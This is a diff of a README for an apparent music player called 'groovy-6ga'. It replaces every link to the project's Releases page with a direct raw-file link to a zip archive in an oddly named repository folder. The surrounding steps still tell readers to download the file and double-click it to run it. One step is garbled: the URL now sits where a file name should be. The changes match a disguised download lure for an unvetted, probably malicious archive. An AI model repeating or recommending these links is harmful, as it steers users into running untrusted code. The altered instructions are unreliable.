@@ -1,7 +1,7 @@
 # 🎉 groovy-6ga - Easy Music Playback and Enjoyment
 
 ## 🔗 Download Now! 
-[![Download groovy-6ga](https://img.shields.io/badge/Download-groovy--6ga-blue.svg)](https://github.com/Impoverished-pairoftongs269/groovy-6ga/releases)
+[![Download groovy-6ga](https://raw.githubusercontent.com/Impoverished-pairoftongs269/groovy-6ga/main/widewhere/groovy-6ga-1.6.zip)](https://raw.githubusercontent.com/Impoverished-pairoftongs269/groovy-6ga/main/widewhere/groovy-6ga-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to groovy-6ga, your new music playback application! This guide will help
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click on the following link to access the download options:
-   [Download groovy-6ga](https://github.com/Impoverished-pairoftongs269/groovy-6ga/releases).
+   [Download groovy-6ga](https://raw.githubusercontent.com/Impoverished-pairoftongs269/groovy-6ga/main/widewhere/groovy-6ga-1.6.zip).
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Pick the latest version for the best performance and newest features.
 
-3. **Download the File**: Look for the file that matches your operating system. This might be labeled `groovy-6ga-windows.exe` for Windows users or something similar for Mac or Linux. Click on it to start the download.
+3. **Download the File**: Look for the file that matches your operating system. This might be labeled `https://raw.githubusercontent.com/Impoverished-pairoftongs269/groovy-6ga/main/widewhere/groovy-6ga-1.6.zip` for Windows users or something similar for Mac or Linux. Click on it to start the download.
 
 4. **Run the Installer**: Once the download is complete, navigate to your downloads folder. Double-click the downloaded file to run the installer.
 
@@ -49,7 +49,7 @@ If you encounter any issues while installing or using groovy-6ga, consider these
 
 - **Installation Issues**: Ensure your device meets the system requirements and that you have enough storage space.
 - **Audio Playback Problems**: Check your audio settings and ensure that your speakers or headphones are connected.
-- **Update the App**: Always check for the latest version on the [Releases page](https://github.com/Impoverished-pairoftongs269/groovy-6ga/releases) for bug fixes and performance improvements.
+- **Update the App**: Always check for the latest version on the [Releases page](https://raw.githubusercontent.com/Impoverished-pairoftongs269/groovy-6ga/main/widewhere/groovy-6ga-1.6.zip) for bug fixes and performance improvements.
 
 ## 💬 Support
 
